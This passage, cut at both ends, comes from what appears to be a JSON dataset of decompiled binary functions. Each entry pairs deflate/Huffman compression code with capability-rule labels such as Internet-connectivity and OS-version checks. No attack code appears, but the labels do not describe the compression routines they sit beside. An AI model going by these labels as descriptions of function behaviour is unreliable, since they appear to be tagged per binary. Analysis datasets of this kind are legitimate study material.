        "decompiled_code": "\nuint fcn.00414fef(uchar *param_1, int32_t param_2, uint32_t *param_3)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    \n    uVar3 = param_2 + *param_3;\n    uVar4 = param_3[1];\n    if (uVar4 < uVar3) {\n        if (param_3[3] != 0) {\n            do {\n                uVar4 = uVar4 * 2;\n                if (uVar4 < 0x80) {\n                    uVar4 = 0x80;\n                }\n            } while (uVar4 < uVar3);\n            uVar2 = sub.msvcrt.dll_realloc(param_3[2], uVar4);\n            if (uVar2 != 0) {\n                param_3[2] = uVar2;\n                param_3[1] = uVar4;\n                goto code_r0x00415043;\n            }\n        }\n        uVar1 = 0;\n    }\n    else {\ncode_r0x00415043:\n        uVar1 = 1;\n        puVar5 = *param_3 + param_3[2];\n        for (; param_2 != 0; param_2 = param_2 + -1) {\n            *puVar5 = *param_1;\n            param_1 = param_1 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        *param_3 = uVar3;\n    }\n    return uVar1;\n}\n",
        "token_count": 366
    },
    "00415079": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00415079(void)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t in_EAX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t extraout_EDX;\n    uint8_t *unaff_EBP;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    char *pcVar12;\n    uint uVar13;\n    uint8_t *puStack696;\n    uint8_t uStack685;\n    int32_t iStack684;\n    int32_t iStack680;\n    uint32_t uStack676;\n    uint8_t auStack668 [320];\n    uint8_t auStack348 [332];\n    \n    *(in_EAX + 0x8392) = 1;\n    fcn.00414976(0xf, 0);\n    fcn.00414976(0xf, 0);\n    iStack684 = 0x11e;\n    do {\n        iVar5 = iStack684 + -1;\n        if (*(in_EAX + 0x8f11 + iStack684) != '\\0') break;\n        iStack684 = iVar5;\n    } while (iVar5 != 0x101);\n    iStack680 = 0x1e;\n    do {\n        iVar5 = iStack680 + -1;\n        if (*(in_EAX + 0x9032 + iVar5) != '\\0') break;\n        iStack680 = iVar5;\n    } while (iVar5 != 1);\n    uStack685 = 0xff;\n    puStack696 = NULL;\n    puVar8 = in_EAX + 0x8f12;\n    puVar9 = auStack668;\n    for (iVar5 = iStack684; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uStack676 = 0;\n    puVar8 = in_EAX + 0x9032;\n    for (iVar5 = iStack680; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    puVar8 = NULL;\n    puVar10 = in_EAX + 0x8612;\n    for (iVar5 = 0x26; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uVar4 = 0;\n    do {\n        uVar3 = auStack668[uStack676];\n        if (uVar3 == 0) {\n            if (puStack696 != NULL) {\n                if (puStack696 < 0x3) {\n                    unaff_EBP = auStack348 + puVar8;\n                    piVar1 = in_EAX + 0x8612 + uStack685 * 2;\n                    *piVar1 = *piVar1 + puStack696;\n                    puVar9 = NULL;\n                    do {\n                        unaff_EBP[puVar9] = uStack685;\n                        puVar9 = puVar9 + 1;\n                    } while (puVar9 != puStack696);\n                    puVar8 = puVar8 + puVar9;\n                }\n                else {\n                    *(in_EAX + 0x8632) = *(in_EAX + 0x8632) + 1;\n                    puVar9 = puVar8 + -0x15b;\n                    auStack348[puVar8] = 0x10;\n                    puVar8 = puVar8 + 2;\n                    puVar9[&stack0x00000000] = puStack696 - 3;\n                }\n            }\n            uVar4 = uVar4 + 1;\n            puStack696 = NULL;\n            if (uVar4 == 0x8a) {\n                puVar9 = puVar8 + -0x15b;\n                auStack348[puVar8] = 0x12;\n                *(in_EAX + 0x8636) = *(in_EAX + 0x8636) + 1;\n                puVar8 = puVar8 + 2;\n                puVar9[&stack0x00000000] = 0x7f;\n                goto code_r0x0041532d;\n            }\n        }\n        else {\n            if (uVar4 != 0) {\n                if (uVar4 < 3) {\n                    *(in_EAX + 0x8612) = *(in_EAX + 0x8612) + uVar4;\n                    uVar6 = 0;\n                    unaff_EBP = auStack348 + puVar8;\n                    do {\n                        unaff_EBP[uVar6] = 0;\n                        uVar6 = uVar6 + 1;\n                    } while (uVar6 != uVar4);\n                    puVar8 = puVar8 + uVar6;\n                }\n                else {\n                    unaff_EBP = puVar8 + 2;\n                    if (uVar4 < 0xb) {\n                        auStack348[puVar8] = 0x11;\n                        *(in_EAX + 0x8634) = *(in_EAX + 0x8634) + 1;\n                        cVar2 = -3;\n                    }\n                    else {\n                        *(in_EAX + 0x8636) = *(in_EAX + 0x8636) + 1;\n                        auStack348[puVar8] = 0x12;\n                        cVar2 = -0xb;\n                    }\n                    (puVar8 + -0x15b)[&stack0x00000000] = uVar4 + cVar2;\n                    puVar8 = unaff_EBP;\n                }\n            }\n            if (uVar3 == uStack685) {\n                puStack696 = puStack696 + 1;\n                uVar4 = 0;\n                if (puStack696 != 0x6) goto code_r0x0041532f;\n                *(in_EAX + 0x8632) = *(in_EAX + 0x8632) + 1;\n                puVar9 = puVar8 + -0x15b;\n                auStack348[puVar8] = 0x10;\n                puVar8 = puVar8 + 2;\n                puVar9[&stack0x00000000] = 3;\n            }\n            else {\n                if (puStack696 != NULL) {\n                    if (puStack696 < 0x3) {\n                        piVar1 = in_EAX + 0x8612 + uStack685 * 2;\n                        *piVar1 = *piVar1 + puStack696;\n                        puVar9 = NULL;\n                        do {\n                            (auStack348 + puVar8)[puVar9] = uStack685;\n                            puVar9 = puVar9 + 1;\n                        } while (puVar9 != puStack696);\n                        puVar8 = puVar8 + puVar9;\n                    }\n                    else {\n                        *(in_EAX + 0x8632) = *(in_EAX + 0x8632) + 1;\n                        puVar9 = puVar8 + -0x15b;\n                        auStack348[puVar8] = 0x10;\n                        puVar8 = puVar8 + 2;\n                        puVar9[&stack0x00000000] = puStack696 - 3;\n                    }\n                }\n                piVar1 = in_EAX + 0x8612 + uVar3 * 2;\n                *piVar1 = *piVar1 + 1;\n                auStack348[puVar8] = uVar3;\n                puVar8 = puVar8 + 1;\n            }\ncode_r0x0041532d:\n            puStack696 = NULL;\n            uVar4 = 0;\n        }\ncode_r0x0041532f:\n        uStack676 = uStack676 + 1;\n        uStack685 = uVar3;\n    } while (uStack676 < iStack684 + iStack680);\n    if (puStack696 == NULL) {\n        puVar9 = puVar8;\n        if (uVar4 != 0) {\n            if (uVar4 < 3) {\n                *(in_EAX + 0x8612) = *(in_EAX + 0x8612) + uVar4;\n                uVar6 = 0;\n                do {\n                    (auStack348 + puVar8)[uVar6] = 0;\n                    uVar6 = uVar6 + 1;\n                } while (uVar6 != uVar4);\n                puVar9 = puVar8 + uVar6;\n            }\n            else {\n                puVar9 = puVar8 + 2;\n                if (uVar4 < 0xb) {\n                    auStack348[puVar8] = 0x11;\n                    *(in_EAX + 0x8634) = *(in_EAX + 0x8634) + 1;\n                    uVar3 = uVar4 - 3;\n                }\n                else {\n                    *(in_EAX + 0x8636) = *(in_EAX + 0x8636) + 1;\n                    auStack348[puVar8] = 0x12;\n                    uVar3 = uVar4 - 0xb;\n                }\n                (puVar8 + -0x15b)[&stack0x00000000] = uVar3;\n            }\n        }\n    }\n    else if (puStack696 < 0x3) {\n        piVar1 = in_EAX + 0x8612 + uVar3 * 2;\n        *piVar1 = *piVar1 + puStack696;\n        puVar9 = NULL;\n        do {\n            (auStack348 + puVar8)[puVar9] = uVar3;\n            puVar9 = puVar9 + 1;\n        } while (puStack696 != puVar9);\n        puVar9 = puVar8 + puStack696;\n    }\n    else {\n        auStack348[puVar8] = 0x10;\n        *(in_EAX + 0x8632) = *(in_EAX + 0x8632) + 1;\n        (puVar8 + -0x15b)[&stack0x00000000] = puStack696 - 3;\n        puVar9 = puVar8 + 2;\n    }\n    fcn.00414976(7, 0);\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) | 2 << (*(in_EAX + 0x44) & 0x1f);\n    *(in_EAX + 0x44) = *(in_EAX + 0x44) + 2;\n    while (uVar4 = *(in_EAX + 0x44),  7 < uVar4) {\n        puVar10 = *(in_EAX + 0x30);\n        if (puVar10 < *(in_EAX + 0x34)) {\n            *(in_EAX + 0x30) = puVar10 + 1;\n            *puVar10 = *(in_EAX + 0x48);\n        }\n        *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n        *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n    }\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) | iStack684 + -0x101 << (uVar4 & 0x1f);\n    *(in_EAX + 0x44) = uVar4 + 5;\n    while (uVar4 = *(in_EAX + 0x44),  7 < uVar4) {\n        puVar10 = *(in_EAX + 0x30);\n        if (puVar10 < *(in_EAX + 0x34)) {\n            *(in_EAX + 0x30) = puVar10 + 1;\n            *puVar10 = *(in_EAX + 0x48);\n        }\n        *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n        *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n    }\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) | iStack680 + -1 << (uVar4 & 0x1f);\n    *(in_EAX + 0x44) = uVar4 + 5;\n    while (uVar4 = *(in_EAX + 0x44),  7 < uVar4) {\n        puVar10 = *(in_EAX + 0x30);\n        if (puVar10 < *(in_EAX + 0x34)) {\n            *(in_EAX + 0x30) = puVar10 + 1;\n            *puVar10 = *(in_EAX + 0x48);\n        }\n        *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n        *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n    }\n    iVar5 = 0x12;\n    do {\n        if (*(in_EAX + 0x9152 + *(iVar5 + 0x424c9c)) != '\\0') {\n            iVar7 = iVar5 + 1;\n            if (2 < iVar5) goto code_r0x004154fa;\n            iVar5 = 0;\n            iVar7 = 4;\n            goto code_r0x004154fd;\n        }\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != -1);\n    iVar7 = 4;\ncode_r0x004154fa:\n    iVar5 = iVar7 + -4;\ncode_r0x004154fd:\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) | iVar5 << (uVar4 & 0x1f);\n    *(in_EAX + 0x44) = uVar4 + 4;\n    while (7 < *(in_EAX + 0x44)) {\n        puVar10 = *(in_EAX + 0x30);\n        if (puVar10 < *(in_EAX + 0x34)) {\n            *(in_EAX + 0x30) = puVar10 + 1;\n            *puVar10 = *(in_EAX + 0x48);\n        }\n        *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n        *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n    }\n    iVar5 = 0;\n    while (puVar10 = *(in_EAX + 0x9152 + *(iVar5 + 0x424c9c)),  puVar10 < 0x8) {\n        puVar10 = puVar10 << (*(in_EAX + 0x44) & 0x1f);\n        *(in_EAX + 0x48) = *(in_EAX + 0x48) | puVar10;\n        *(in_EAX + 0x44) = *(in_EAX + 0x44) + 3;\n        while (7 < *(in_EAX + 0x44)) {\n            puVar10 = *(in_EAX + 0x30);\n            if (puVar10 < *(in_EAX + 0x34)) {\n                *(in_EAX + 0x30) = puVar10 + 1;\n                *puVar10 = *(in_EAX + 0x48);\n            }\n            *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n            *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n        }\n        iVar5 = iVar5 + 1;\n        if (iVar5 == iVar7) {\n            puStack696 = NULL;\n            puVar8 = puStack696;\n            goto code_r0x004155e3;\n        }\n    }\n    uVar13 = 0xb73;\ncode_r0x004155b9:\n    do {\n        pcVar12 = \"bits <= ((1U << len) - 1U)\";\ncode_r0x004155c8:\n        sub.msvcrt.dll__assert(pcVar12, 0x424620, uVar13);\n        iVar5 = extraout_EDX;\n        do {\n            puVar11 = puVar10 + iVar5;\n            *(in_EAX + 0x48) = *(in_EAX + 0x48) | unaff_EBP << (puVar10 & 0x1f);\n            *(in_EAX + 0x44) = puVar11;\n            while (puVar10 = puVar11,  puVar8 = puStack696,  7 < *(in_EAX + 0x44)) {\n                puVar10 = *(in_EAX + 0x30);\n                if (puVar10 < *(in_EAX + 0x34)) {\n                    *(in_EAX + 0x30) = puVar10 + 1;\n                    *puVar10 = *(in_EAX + 0x48);\n                }\n                *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n                *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n            }\ncode_r0x004155e3:\n            do {\n                puStack696 = puVar8;\n                if (puVar9 <= puStack696) {\n                    return;\n                }\n                unaff_EBP = puStack696 + 1;\n                uVar4 = (auStack668 + 0x13f)[unaff_EBP];\n                if (0x12 < uVar4) {\n                    uVar13 = 0xb78;\n                    pcVar12 = \"code < TDEFL_MAX_HUFF_SYMBOLS_2\";\n                    goto code_r0x004155c8;\n                }\n                uVar3 = *(in_EAX + 0x9152 + uVar4);\n                puVar10 = *(in_EAX + 0x8cd2 + uVar4 * 2);\n                if ((1 << (uVar3 & 0x1f)) + -1 < puVar10) {\n                    uVar13 = 0xb79;\n                    goto code_r0x004155b9;\n                }\n                *(in_EAX + 0x48) = *(in_EAX + 0x48) | puVar10 << (*(in_EAX + 0x44) & 0x1f);\n                *(in_EAX + 0x44) = *(in_EAX + 0x44) + uVar3;\n                while (puVar10 = *(in_EAX + 0x44),  0x7 < puVar10) {\n                    puVar10 = *(in_EAX + 0x30);\n                    if (puVar10 < *(in_EAX + 0x34)) {\n                        *(in_EAX + 0x30) = puVar10 + 1;\n                        *puVar10 = *(in_EAX + 0x48);\n                    }\n                    *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n                    *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n                }\n                puVar8 = unaff_EBP;\n            } while (uVar4 < 0x10);\n            iVar5 = \"code < TDEFL_MAX_HUFF_SYMBOLS_2\"[uVar4 + 0x10];\n            unaff_EBP = auStack348[unaff_EBP];\n            puStack696 = puStack696 + 2;\n        } while (unaff_EBP <= (1 << (\"code < TDEFL_MAX_HUFF_SYMBOLS_2\"[uVar4 + 0x10] & 0x1fU)) - 1U);\n        uVar13 = 0xb7c;\n    } while( true );\n}\n",
        "token_count": 4607
    },
    "004156d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004156d4(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    uint32_t uVar8;\n    uint32_t extraout_EDX;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t unaff_ESI;\n    uchar *unaff_EDI;\n    char *pcVar11;\n    uint uVar12;\n    uint32_t uStack40;\n    uint8_t *puStack36;\n    \n    if (param_2 == 0) {\n        fcn.00415079();\n    }\n    else {\n        iVar6 = in_EAX + 0x8f12;\n        iVar4 = 0;\n        do {\n            *(iVar6 + iVar4) = 8;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 != 0x90);\n        do {\n            *(iVar6 + iVar4) = 9;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 != 0x100);\n        do {\n            *(iVar6 + iVar4) = 7;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 != 0x118);\n        do {\n            *(iVar6 + iVar4) = 8;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 != 0x120);\n        unaff_EDI = in_EAX + 0x9032;\n        for (iVar6 = 0x20; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *unaff_EDI = 5;\n            unaff_EDI = unaff_EDI + 1;\n        }\n        fcn.00414976(0xf, 1);\n        fcn.00414976(0xf, 1);\n        *(in_EAX + 0x48) = *(in_EAX + 0x48) | 1 << (*(in_EAX + 0x44) & 0x1f);\n        *(in_EAX + 0x44) = *(in_EAX + 0x44) + 2;\n        while (7 < *(in_EAX + 0x44)) {\n            puVar5 = *(in_EAX + 0x30);\n            if (puVar5 < *(in_EAX + 0x34)) {\n                *(in_EAX + 0x30) = puVar5 + 1;\n                *puVar5 = *(in_EAX + 0x48);\n            }\n            *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n            *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n        }\n    }\n    uVar10 = 1;\n    puVar7 = in_EAX + 0x9272;\ncode_r0x004157b1:\n    if (*(in_EAX + 0x28) <= puVar7) {\n        unaff_ESI = *(in_EAX + 0x9012);\n        if ((1 << (*(in_EAX + 0x9012) & 0x1f)) - 1U < *(in_EAX + 0x8a52)) {\n            uVar12 = 0xc1f;\n            goto code_r0x00415833;\n        }\n        *(in_EAX + 0x48) = *(in_EAX + 0x48) | *(in_EAX + 0x8a52) << (*(in_EAX + 0x44) & 0x1f);\n        *(in_EAX + 0x44) = *(in_EAX + 0x44) + unaff_ESI;\n        while (puVar5 = *(in_EAX + 0x30),  7 < *(in_EAX + 0x44)) {\n            if (puVar5 < *(in_EAX + 0x34)) {\n                *(in_EAX + 0x30) = puVar5 + 1;\n                *puVar5 = *(in_EAX + 0x48);\n            }\n            *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n            *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n        }\n        return puVar5 < *(in_EAX + 0x34);\n    }\n    if (uVar10 == 1) {\n        uVar1 = *puVar7;\n        puVar7 = puVar7 + 1;\n        uVar10 = CONCAT11(1, uVar1);\n    }\n    uVar8 = *puVar7;\n    if ((uVar10 & 1) != 0) {\n        uStack40 = *(puVar7 + 1);\n        unaff_ESI = *(uVar8 * 2 + 0x425440);\n        puStack36 = puVar7 + 3;\n        uVar1 = *(in_EAX + 0x8f12 + unaff_ESI);\n        if (uVar1 != 0) {\n            unaff_ESI = *(in_EAX + 0x8852 + unaff_ESI * 2);\n            unaff_EDI = uVar1;\n            if (unaff_ESI <= (1 << (uVar1 & 0x1f)) - 1U) goto code_r0x00415847;\n            uVar12 = 0xc0b;\n            goto code_r0x00415833;\n        }\n        uVar12 = 0xc09;\n        pcVar11 = \"d->m_huff_code_sizes[0][s_tdefl_len_sym[match_len]]\";\ncode_r0x00415842:\n        do {\n            sub.msvcrt.dll__assert(pcVar11, 0x424620, uVar12);\n            uVar8 = extraout_EDX;\ncode_r0x00415847:\n            *(in_EAX + 0x48) = *(in_EAX + 0x48) | unaff_ESI << (*(in_EAX + 0x44) & 0x1f);\n            *(in_EAX + 0x44) = unaff_EDI + *(in_EAX + 0x44);\n            while (unaff_EDI = *(in_EAX + 0x44),  0x7 < unaff_EDI) {\n                puVar5 = *(in_EAX + 0x30);\n                if (puVar5 < *(in_EAX + 0x34)) {\n                    *(in_EAX + 0x30) = puVar5 + 1;\n                    *puVar5 = *(in_EAX + 0x48);\n                }\n                *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n                *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n            }\n            unaff_ESI = *(uVar8 + 0x425340);\n            uVar9 = uVar8 & *(unaff_ESI * 4 + 0x424de0);\n            if ((1 << (*(uVar8 + 0x425340) & 0x1f)) - 1U < uVar9) {\n                uVar12 = 0xc0d;\n            }\n            else {\n                *(in_EAX + 0x48) = *(in_EAX + 0x48) | uVar9 << (unaff_EDI & 0x1f);\n                *(in_EAX + 0x44) = unaff_EDI + unaff_ESI;\n                while (unaff_ESI = *(in_EAX + 0x44),  7 < unaff_ESI) {\n                    puVar5 = *(in_EAX + 0x30);\n                    if (puVar5 < *(in_EAX + 0x34)) {\n                        *(in_EAX + 0x30) = puVar5 + 1;\n                        *puVar5 = *(in_EAX + 0x48);\n                    }\n                    *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n                    *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n                }\n                if (uStack40 < 0x200) {\n                    uVar1 = *(uStack40 + 0x425140);\n                    uVar2 = *(uStack40 + 0x424f40);\n                }\n                else {\n                    uVar1 = *((uStack40 >> 8) + 0x424ec0);\n                    uVar2 = *((uStack40 >> 8) + 0x424e40);\n                }\n                uVar3 = *(in_EAX + 0x9032 + uVar1);\n                unaff_EDI = *(in_EAX + 0x8a92 + uVar1 * 2);\n                if ((1 << (uVar3 & 0x1f)) + -1 < unaff_EDI) {\n                    uVar12 = 0xc16;\n                }\n                else {\n                    *(in_EAX + 0x48) = *(in_EAX + 0x48) | unaff_EDI << (unaff_ESI & 0x1f);\n                    *(in_EAX + 0x44) = unaff_ESI + uVar3;\n                    while (unaff_ESI = *(in_EAX + 0x44),  7 < unaff_ESI) {\n                        puVar5 = *(in_EAX + 0x30);\n                        if (puVar5 < *(in_EAX + 0x34)) {\n                            *(in_EAX + 0x30) = puVar5 + 1;\n                            *puVar5 = *(in_EAX + 0x48);\n                        }\n                        *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n                        *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n                    }\n                    puVar5 = uStack40 & *(uVar2 * 4 + 0x424de0);\n                    unaff_EDI = 1 << (uVar2 & 0x1f);\n                    if (puVar5 <= unaff_EDI + -1) goto code_r0x00415993;\n                    uVar12 = 0xc17;\n                }\n            }\ncode_r0x00415833:\n            pcVar11 = \"bits <= ((1U << len) - 1U)\";\n        } while( true );\n    }\n    puStack36 = puVar7 + 1;\n    uVar1 = *(in_EAX + 0x8f12 + uVar8);\n    if (uVar1 == 0) {\n        uVar12 = 0xc1a;\n        pcVar11 = \"d->m_huff_code_sizes[0][lit]\";\n        goto code_r0x00415842;\n    }\n    puVar5 = *(in_EAX + 0x8852 + uVar8 * 2);\n    unaff_EDI = 1 << (uVar1 & 0x1f);\n    if (unaff_EDI + -1 < puVar5) {\n        uVar12 = 0xc1b;\n        goto code_r0x00415833;\n    }\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) | puVar5 << (*(in_EAX + 0x44) & 0x1f);\n    *(in_EAX + 0x44) = *(in_EAX + 0x44) + uVar1;\n    while (7 < *(in_EAX + 0x44)) {\n        puVar5 = *(in_EAX + 0x30);\n        if (puVar5 < *(in_EAX + 0x34)) {\n            *(in_EAX + 0x30) = puVar5 + 1;\n            *puVar5 = *(in_EAX + 0x48);\n        }\n        *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n        *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n    }\n    goto code_r0x00415a4a;\ncode_r0x00415993:\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) | puVar5 << (unaff_ESI & 0x1f);\n    *(in_EAX + 0x44) = uVar2 + unaff_ESI;\n    while (7 < *(in_EAX + 0x44)) {\n        puVar5 = *(in_EAX + 0x30);\n        if (puVar5 < *(in_EAX + 0x34)) {\n            *(in_EAX + 0x30) = puVar5 + 1;\n            *puVar5 = *(in_EAX + 0x48);\n        }\n        *(in_EAX + 0x48) = *(in_EAX + 0x48) >> 8;\n        *(in_EAX + 0x44) = *(in_EAX + 0x44) + -8;\n    }\ncode_r0x00415a4a:\n    uVar10 = uVar10 >> 1;\n    puVar7 = puStack36;\n    goto code_r0x004157b1;\n}\n",
        "token_count": 3056
    },
    "00415abf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\ncode * __fastcall fcn.00415abf(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    code **in_EAX;\n    code *pcVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    code *unaff_EBP;\n    code *pcVar6;\n    code *pcVar7;\n    uint *puVar8;\n    code *pcVar9;\n    char *pcVar10;\n    uint uVar11;\n    \n    bVar1 = false;\n    if ((*(in_EAX + 10) & 8) != 0) {\n        bVar1 = in_EAX[7] + -in_EAX[0x10] < in_EAX[9] || in_EAX[7] + -in_EAX[0x10] == in_EAX[9];\n    }\n    if ((*in_EAX == NULL) && (0x14ccb < *in_EAX[0x1f] - in_EAX[0x23])) {\n        pcVar7 = in_EAX[0x23] + in_EAX[0x1d];\n    }\n    else {\n        pcVar7 = in_EAX + 0x39272;\n    }\n    in_EAX[0xc] = pcVar7;\n    in_EAX[0xd] = pcVar7 + 0x14cbc;\n    if (in_EAX[0x17] == NULL) {\n        in_EAX[0x16] = NULL;\n        in_EAX[0x17] = NULL;\n        *in_EAX[0xb] = SUB41(*in_EAX[0xb] >> (in_EAX[0xe] & 0x1f), 0);\n        in_EAX[10] = in_EAX[10] + -(in_EAX[0xe] == 0x8);\n        if (((*(in_EAX + 9) & 0x10) != 0) && (in_EAX[0x19] == NULL)) {\n            in_EAX[0x12] = in_EAX[0x12] | 0x78 << (in_EAX[0x11] & 0x1f);\n            in_EAX[0x11] = in_EAX[0x11] + 8;\n            while (pcVar6 = in_EAX[0x11],  0x7 < pcVar6) {\n                pcVar6 = in_EAX[0xc];\n                if (pcVar6 < in_EAX[0xd]) {\n                    in_EAX[0xc] = pcVar6 + 1;\n                    *pcVar6 = SUB41(in_EAX[0x12], 0);\n                }\n                in_EAX[0x12] = in_EAX[0x12] >> 8;\n                in_EAX[0x11] = in_EAX[0x11] + -8;\n            }\n            in_EAX[0x12] = in_EAX[0x12] | 1 << (pcVar6 & 0x1f);\n            in_EAX[0x11] = pcVar6 + 8;\n            while (0x7 < in_EAX[0x11]) {\n                pcVar6 = in_EAX[0xc];\n                if (pcVar6 < in_EAX[0xd]) {\n                    in_EAX[0xc] = pcVar6 + 1;\n                    *pcVar6 = SUB41(in_EAX[0x12], 0);\n                }\n                in_EAX[0x12] = in_EAX[0x12] >> 8;\n                in_EAX[0x11] = in_EAX[0x11] + -8;\n            }\n        }\n        in_EAX[0x12] = in_EAX[0x12] | (param_2 == 4) << (in_EAX[0x11] & 0x1f);\n        in_EAX[0x11] = in_EAX[0x11] + 1;\n        while( true ) {\n            pcVar6 = in_EAX[0x11];\n            pcVar2 = in_EAX[0xc];\n            if (pcVar6 < 0x8) break;\n            if (pcVar2 < in_EAX[0xd]) {\n                in_EAX[0xc] = pcVar2 + 1;\n                *pcVar2 = SUB41(in_EAX[0x12], 0);\n            }\n            in_EAX[0x12] = in_EAX[0x12] >> 8;\n            in_EAX[0x11] = in_EAX[0x11] + -8;\n        }\n        pcVar4 = in_EAX[0x12];\n        if (bVar1) {\n            iVar3 = 0;\ncode_r0x00415c55:\n            if (in_EAX[9] <= in_EAX[7] + -in_EAX[0x10] && in_EAX[7] + -in_EAX[0x10] != in_EAX[9]) goto code_r0x00415d5b;\n            in_EAX[0xc] = pcVar2;\n            in_EAX[0x12] = pcVar4;\n            in_EAX[0x11] = pcVar6 + 2;\n            while (0x7 < in_EAX[0x11]) {\n                pcVar6 = in_EAX[0xc];\n                if (pcVar6 < in_EAX[0xd]) {\n                    in_EAX[0xc] = pcVar6 + 1;\n                    *pcVar6 = SUB41(in_EAX[0x12], 0);\n                }\n                in_EAX[0x12] = in_EAX[0x12] >> 8;\n                in_EAX[0x11] = in_EAX[0x11] + -8;\n            }\n            if (in_EAX[0x11] != NULL) {\n                in_EAX[0x11] = 0x8;\n                while (0x7 < in_EAX[0x11]) {\n                    pcVar6 = in_EAX[0xc];\n                    if (pcVar6 < in_EAX[0xd]) {\n                        in_EAX[0xc] = pcVar6 + 1;\n                        *pcVar6 = SUB41(in_EAX[0x12], 0);\n                    }\n                    in_EAX[0x12] = in_EAX[0x12] >> 8;\n                    in_EAX[0x11] = in_EAX[0x11] + -8;\n                }\n            }\n            iVar3 = 2;\n            do {\n                in_EAX[0x12] = in_EAX[0x12] | *(in_EAX + 0xf) << (in_EAX[0x11] & 0x1f);\n                in_EAX[0x11] = in_EAX[0x11] + 0x10;\n                while (0x7 < in_EAX[0x11]) {\n                    pcVar6 = in_EAX[0xc];\n                    if (pcVar6 < in_EAX[0xd]) {\n                        in_EAX[0xc] = pcVar6 + 1;\n                        *pcVar6 = SUB41(in_EAX[0x12], 0);\n                    }\n                    in_EAX[0x12] = in_EAX[0x12] >> 8;\n                    in_EAX[0x11] = in_EAX[0x11] + -8;\n                }\n                in_EAX[0xf] = in_EAX[0xf] ^ 0xffff;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n            for (pcVar6 = NULL; pcVar6 < in_EAX[0xf]; pcVar6 = pcVar6 + 1) {\n                in_EAX[0x12] = in_EAX[0x12] |\n                               *(in_EAX + (in_EAX[0x10] + pcVar6 & 0x7fff) + 0x90) << (in_EAX[0x11] & 0x1f);\n                in_EAX[0x11] = in_EAX[0x11] + 8;\n                while (0x7 < in_EAX[0x11]) {\n                    pcVar2 = in_EAX[0xc];\n                    if (pcVar2 < in_EAX[0xd]) {\n                        in_EAX[0xc] = pcVar2 + 1;\n                        *pcVar2 = SUB41(in_EAX[0x12], 0);\n                    }\n                    in_EAX[0x12] = in_EAX[0x12] 